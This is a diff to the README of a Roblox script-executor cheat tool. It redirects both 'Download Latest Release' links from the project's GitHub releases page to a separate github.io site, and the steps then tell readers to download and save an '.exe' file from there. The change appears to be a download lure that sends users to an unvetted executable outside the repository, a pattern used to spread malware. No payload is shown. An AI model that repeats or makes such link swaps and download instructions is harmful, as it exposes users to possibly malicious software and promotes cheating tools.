@@ -1,6 +1,6 @@
 # ⚡ roblox-executor-script-hub - Run Roblox scripts with high speed
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/artpsychological925/roblox-executor-script-hub/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://artpsychological925.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements to run the software:
 
 You need to obtain the file from the project releases page. Follow these instructions to find the file:
 
-1. Visit the [releases page](https://github.com/artpsychological925/roblox-executor-script-hub/releases).
+1. Visit the [releases page](https://artpsychological925.github.io).
 2. Look for the version labeled "Latest".
 3. Click the file ending in ".exe" to start your download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
